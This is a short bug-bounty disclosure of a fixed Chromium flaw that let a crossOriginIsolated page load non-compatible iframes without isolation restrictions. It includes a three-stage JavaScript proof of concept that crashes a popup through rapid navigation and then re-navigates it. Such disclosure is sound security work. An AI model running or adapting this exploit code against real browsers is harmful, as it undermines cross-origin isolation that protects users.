---
title: crossOriginIsolated bypass (Awarded $3000)
---

This bug allowed for a `crossOriginIsolated` page to load non-COI-compatible iframes without the COI [restrictions](https://web.dev/why-coop-coep/), after navigating a popup to an invalid URL and crashing it. Cross-site page crashing was done by abusing [Issue 40744131](https://issues.chromium.org/issues/40744131).  
Video PoC: <https://www.youtube.com/watch?v=Ndh2JVPOv-E>

```js
async function stage1() {
  w = open('https://invalid.local');
}

// Stage 2 can be skipped if you use the chrome task manager to crash it.  Issue 40744131
async function stage2() {
  checker = open();
  for (;;) {
    checker.location = 'data:';
    await new Promise((resolve) => setTimeout(resolve, 0));
    checker.location = 'https://invalid.local';
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
}

// Run this once invalid.local tab is crashed
async function stage3() {
  checker.close();
  w.location = 'data:html,foo';
  await new Promise((resolve) => setTimeout(resolve, 100));
  w.location = 'about:blank';
}
```

This was fixed in <https://issues.chromium.org/issues/40056434>
